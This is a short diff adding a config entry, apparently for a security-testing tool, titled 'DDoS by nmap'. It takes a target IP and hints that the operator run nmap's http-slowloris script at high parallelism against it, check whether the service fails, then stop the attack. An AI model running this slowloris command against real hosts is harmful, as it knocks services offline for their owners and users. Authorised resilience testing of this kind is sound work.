@@ -1,0 +1,10 @@
+description: DDoS by nmap
+function: magic_function
+argument: []
+In: [IP]
+condition: 
+Out: []
+hint: 
+  - "open another terminal, enter `sudo nmap --script http-slowloris --max-parallelism 400 {Data['IP']}"
+  - "check if the sevice is unable to work well after above attack(y/N)"
+  - "stop attacking by entering ctrl+C"
